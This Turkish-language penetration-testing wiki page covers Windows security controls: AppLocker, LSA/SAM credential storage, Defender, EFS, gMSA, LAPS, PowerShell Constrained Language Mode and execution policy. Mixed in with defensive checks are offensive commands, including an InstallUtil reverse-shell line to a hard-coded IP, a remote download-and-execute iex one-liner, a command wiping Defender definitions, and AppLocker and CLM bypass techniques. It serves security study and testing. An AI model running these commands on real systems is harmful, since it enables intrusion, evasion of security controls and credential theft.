# Windows Güvenlik Denetimleri

{{#include ../banners/hacktricks-training.md}}

## AppLocker Politikası

Uygulama whitelist'i, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı malware ve kuruluşun belirli iş ihtiyaçlarına uymayan onaylanmamış yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **uygulama whitelist'i çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** konusunda denetim sağlar. Yürütülebilir dosyalar, script'ler, Windows Installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama yükleyicileri üzerinde **ayrıntılı denetim** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi ve belirli dizinlere yazma erişimini engellemesi** yaygındır, **ancak bunların tümü bypass edilebilir**.

### Kontrol

Hangi dosyaların/uzantıların blacklist'e/whitelist'e alındığını kontrol edin:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy`, belirli bir kimlik için aday dosyaları bir AppLocker policy’ye göre değerlendirir. Kurallar kullanıcıları veya grupları hedefleyebileceğinden, payload’ı çalıştıracak token’a sahip hesabı test edin; kuralların eşleşebileceği yol, hash ve publisher metadata’sını incelemek için `Get-AppLockerFileInformation` da kullanışlıdır.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Reddedilen bir test sonucunu zorunlu engelleme olarak değerlendirmeden önce, **ilgili kural koleksiyonunun etkin yaptırım modunu** ve Application Identity hizmetini inceleyin. `AuditOnly` kuralları değerlendirir ancak çalıştırmaya yine de izin verir; bu koleksiyonda kurallar bulunduğunda `NotConfigured`, devre dışı bırakılmış olmakla aynı anlama gelmez.<sup>[[7]](#references)</sup> Durdurulmuş bir `AppIDSvc`, AppLocker yaptırımını engeller.<sup>[[9]](#references)</sup> Bu kontroller, gerçek bir bypass ile dosyayı hiçbir zaman engellememiş bir ilkeyi birbirinden ayırır.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Kontrollü bir yürütme testi için AppLocker olay günlüğünü karşılaştırın: **8003/8006**, EXE/DLL veya script/MSI dosyasının audit mode'da engellenecek olduğu anlamına gelir; **8004/8007** ise gerçekten engellendiğini gösterir. Hedeflenen yürütme yoluyla aynı dosya türünü ve kimliği kullanarak test edin.<sup>[[8]](#references)</sup>

Bu kayıt defteri yolu, AppLocker tarafından uygulanan yapılandırmaları ve ilkeleri içerir ve sistemde yürürlükte olan mevcut kural kümesini incelemenin bir yolunu sunar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **yazılabilir klasörler**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyin yürütülmesine izin veriyorsa **bypass** etmek için kullanabileceğiniz **yazılabilir klasörler** vardır.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Genellikle **güvenilir** [**"LOLBAS's"**](https://lolbas-project.github.io/) binary'leri de AppLocker'ı bypass etmek için kullanışlı olabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
  - Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz; bu klasöre izin verilir.
  - Kurumlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` yürütülebilir dosyasını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi [**diğer PowerShell yürütülebilir dosyası konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gözden kaçırır.
- **DLL enforcement**, bir sisteme getirebileceği ek yük ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu yürütmek ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Yerel credentials bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Credentials** (hash'lenmiş), Single Sign-On nedeniyle bu alt sistemin **belleğinde** **saklanır**.\
**LSA**, yerel **güvenlik ilkesini** (parola ilkesi, kullanıcı izinleri...), **kimlik doğrulamayı**, **erişim token'larını**... yönetir.\
Yerel bir oturum açma için **SAM** dosyasındaki sağlanan credentials'ı **kontrol eden** ve bir domain kullanıcısının kimliğini doğrulamak için **domain controller** ile **iletişim kuran** bileşen LSA'dır.

**Credentials**, **LSASS process'i** içinde **saklanır**: Kerberos biletleri, NT ve LM hash'leri, kolayca şifresi çözülebilen parolalar.

### LSA secrets

LSA bazı credentials'ları diske kaydedebilir:

- Active Directory bilgisayar hesabının parolası (domain controller'a ulaşılamadığında).
- Windows hizmeti hesaplarının parolaları
- Zamanlanmış görevlerin parolaları
- Diğerleri (IIS uygulamalarının parolaları...)

### NTDS.dit

Active Directory veritabanıdır. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir antivirüstür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak, bu **korumaları bypass etmenin** yolları vardır.

### Check

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (etkin olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Listelemek için şunu da çalıştırabilirsiniz:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen bir **simetrik anahtar** kullanarak dosyaları şifrelemeyle korur. Bu anahtar, kullanıcının **açık anahtarıyla** şifrelenir ve dosyanın NTFS `$EFS` meta verilerinde (`$LOGGED_UTILITY_STREAM`), sıradan bir `$DATA` alternatif veri akışında **değil**, saklanır.<sup>[[10]](#references)</sup> Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına ait karşılık gelen **özel anahtar** FEK'in şifresini çözer. Yapılandırılmış bir data recovery agent (DRA), Data Recovery Field'da FEK'in ayrı bir şifrelenmiş kopyasına sahiptir.<sup>[[13]](#references)</sup>

**Kullanıcı başlatmadan gerçekleşen şifre çözme senaryoları** şunlardır:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir dosya sistemine taşındığında otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden ağdan gönderilen şifrelenmiş dosyaların, iletimden önce şifresi çözülür.

Bu şifreleme yöntemi, dosya sahibinin şifrelenmiş dosyalara **şeffaf erişimini** sağlar. Ancak yalnızca sahibin parolasını değiştirmek ve oturum açmak, dosyaların şifresini çözmeye yetmez.

**Önemli noktalar**:

- EFS, kullanıcının açık anahtarıyla şifrelenmiş simetrik bir FEK kullanır.
- Şifre çözme, FEK'e erişmek için kullanıcının özel anahtarını kullanır.
- FAT32'ye kopyalama veya ağ üzerinden iletim gibi belirli koşullarda otomatik şifre çözme gerçekleşir.
- Şifrelenmiş dosyalara, sahibinin ek bir işlem yapmasına gerek kalmadan erişilebilir.

### EFS bilgilerini kontrol etme

`%APPDATA%\Microsoft\Protect` konumundan EFS kullanıldığını çıkarsamayın: bu konum, birçok Windows özelliği için DPAPI ana anahtarlarını saklar.<sup>[[19]](#references)</sup> Bunun yerine, kullanıcı ve kurtarma sertifikalarını listelemek için şifrelenmiş bir dosyayı `cipher /c "C:\path\file"` komutuyla inceleyin. `cipher /e` ve `cipher /d`, eşleşen özel anahtara sahip bir principal için dosyaları şifreler ve şifrelerini çözer.<sup>[[11]](#references)</sup>

### EFS dosyalarının şifresini çözme

`cipher /c` bir kurtarma sertifikası listeliyorsa ve PFX dosyasında bu sertifikayla **eşleşen DRA özel anahtarına** sahipseniz, PFX dosyasını geçerli kullanıcının sertifika deposuna aktarın ve ardından dosyanın şifresini çözün.<sup>[[11]](#references)[[12]](#references)</sup> Yeni oluşturulan bir DRA sertifikası eski dosyaların şifresini çözemez: dosya şifrelenirken açık anahtarının zaten dosyaya eklenmiş olması gerekir. NTFS ACL erişimi veya hesap parolasını sıfırlamak tek başına gerekli özel anahtarı sağlamaz.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### SYSTEM Yetkisi Olmak

Bu yaklaşım, **victim user**'ın ana makinede bir **process** **çalıştırıyor** olmasını gerektirir. Böyleyse `meterpreter` oturumundan kullanıcının process token'ını taklit edebilirsiniz (`incognito` içindeki `impersonate_token`). Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### Kullanıcının Parolasını Bilmek

Mimikatz, kullanıcının sertifikasını ve private key'ini içe aktarabilir, ardından bunları EFS korumalı dosyaların şifresini çözmek için kullanabilir.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, BT altyapılarında service account'ların yönetimini basitleştirmek için **Group Managed Service Accounts (gMSA)** geliştirdi. "**Password never expire**" ayarı genellikle etkin olan geleneksel service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:

- **Otomatik Parola Yönetimi**: gMSA'ler normalde her 30 günde bir yenilenen, karmaşık ve 240 baytlık bir parola kullanır. Domain controller'lar parolayı KDS key materyalini kullanarak türetir; böylece parolayı elle güncelleme ihtiyacı ortadan kalkar.<sup>[[16]](#references)[[20]](#references)</sup>
- **Gelişmiş Güvenlik**: Bu hesaplar kilitlenmeye karşı bağışıktır ve etkileşimli oturum açma için kullanılamaz; bu da güvenliklerini artırır.
- **Birden Fazla Host Desteği**: gMSA'ler birden fazla host arasında paylaşılabilir; bu sayede birden fazla sunucuda çalışan hizmetler için idealdir.
- **Zamanlanmış Görev Desteği**: Managed service account'ların aksine, gMSA'ler zamanlanmış görevleri çalıştırmayı destekler.
- **Basitleştirilmiş SPN Yönetimi**: Bilgisayarın sAMaccount ayrıntıları veya DNS adı değiştiğinde sistem Service Principal Name (SPN) değerini otomatik olarak günceller; bu da SPN yönetimini basitleştirir.

Bir domain controller, LDAP _**msDS-ManagedPassword**_ özniteliğini KDS'den türetilen parola materyalinden okuma sırasında oluşturur; bu değer bağımsız olarak depolanmış bir parola değildir. Normalde her 30 günde bir değişir.<sup>[[20]](#references)</sup> Döndürülen [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) **şifrelenmiş bir parola değildir**: `CurrentPassword` alanı parolayı açık metin olarak içerir.<sup>[[14]](#references)</sup> Erişim, `msDS-GroupMSAMembership` üzerinden denetlenir. Bu nedenle, yalnızca yöneticiler veya hizmet host'ları değil, parolayı alma izni verilen her principal kapsam içindedir.<sup>[[15]](#references)</sup> LDAP bağlantısı, örneğin LDAPS veya SASL sealing aracılığıyla, gizlilik sağlamalıdır.<sup>[[20]](#references)</sup>

KDS root key açığa çıktıktan sonra çevrimdışı parola türetme için bkz. [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Bu parolayı [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)** ile okuyabilirsiniz:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Ayrıca, gMSA'nın **parolasını** **okumak** için **NTLM relay attack** gerçekleştirme yöntemini anlatan [bu web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[3]](#references)</sup>

## LAPS

Enumeration sırasında **legacy Microsoft LAPS** ile yerel **Windows LAPS** uygulamasını birbirinden ayırın. Windows LAPS, 11 Nisan 2023 tarihli Windows güncellemeleriyle sunuldu ve yönetilen bir yerel yönetici parolasını **Windows Server Active Directory**'ye veya **Microsoft Entra ID**'ye yedekleyebilir. AD tabanlı dağıtımlarda parolaları şifreleyebilir, şifrelenmiş parola geçmişini saklayabilir ve bir domain controller'ın DSRM parolasını yönetebilir. İndirilebilir legacy MSI, yeni Windows sürümlerinde kullanımdan kaldırılmıştır; ancak Windows LAPS legacy-emulation modunda çalışabilir.<sup>[[6]](#references)</sup>

Legacy Microsoft LAPS ve Windows LAPS ayrı uygulamalar olduğundan, öznitelik veya cmdlet'e özgü saldırıları uygulamadan önce hangisinin dağıtıldığını belirleyin. Bağlantı verilen sayfada bu prosedürleri burada tekrarlamadan keşif, ACL enumeration, parola alma, sona erme süresini değiştirme ve çevrimdışı kurtarma konuları ele alınmaktadır.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili biçimde kullanmak için gereken özelliklerin çoğunu **kısıtlar**. Örneğin COM nesnelerini engeller; yalnızca onaylanmış .NET türlerine izin verir ve XAML tabanlı iş akışlarını, PowerShell sınıflarını ve daha fazlasını devre dışı bırakır.

### **Kontrol**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2`, isteğe bağlı PowerShell 2 engine yüklü olan hostlarda eski bir sürüme düşürme yöntemiydi. Güncel Windows 11 24H2 veya Windows Server 2025 sürümlerinde artık bulunmaz; bunu güncel bir CLM bypass yöntemi olarak değerlendirmeyin.<sup>[[17]](#references)</sup> Application control altında PowerShell, güvenilmeyen kodu Constrained Language ile çalıştırırken policy tarafından güvenilen script'ler Full Language ile çalışabilir.<sup>[[18]](#references)</sup>

Daha eski yapılandırmalarda [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve projeyi **.Net4.5** olarak değiştirmeniz gerekebilir.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu çalıştırabilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).<sup>[[1]](#references)</sup>

## PS Çalıştırma İlkesi

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu ilkeyi bypass etmenin başlıca yolları:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) bulabilirsiniz<sup>[[4]](#references)</sup>

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilecek API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını belirler. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) denir. Her Windows makinesinde DLL biçiminde bulunurlar ve iletişim kurulabilmesi için her iki makinenin de aynı protokolü desteklemesi gerekir.

### Başlıca SSP'ler

- **Kerberos**: Tercih edilen yöntem
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk gerekçeleriyle kullanılır
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için; parola MD5 hash biçimindedir
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS için
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü (Kerberos veya NTLM; varsayılan Kerberos'tur) belirlemek için kullanılır
  - %windir%\Windows\System32\lsasrv.dll

#### Görüşme birden fazla yöntem veya yalnızca bir yöntem sunabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş yetkiler gerektiren işlemler için onay istemi** gösteren bir özelliktir.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [AppLocker'ı ve PowerShell kısıtlı dil modunu atlatma](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [nasıl yapılır ~ EFS dosyalarının şifresini çözme](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [gMSA için relay saldırısı](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [PowerShell Execution Policy'yi Atlatmanın 15 Yolu](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [AppLocker Windows PowerShell cmdlet'lerini kullanma](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Windows LAPS'e genel bakış](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [AppLocker kurallarıyla çalışma](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [AppLocker ile Event Viewer kullanma](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [AppLocker süreçleri ve etkileşimleri](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Dosya akışları (yerel dosya sistemleri)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Cipher komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Certutil komutu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Kurtarma aracısının EFS özel anahtarını yedekleme](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [ms-DS-GroupMSAMembership özniteliği](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Güvenli grup yönetilen hizmet hesapları](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Windows istemcisinden kaldırılan özellikler](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [PowerShell'i güvenli hale getirmek için App Control kullanma](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [4693 olayı ve DPAPI ana anahtarları](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [msDS-ManagedPassword oluşturma](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
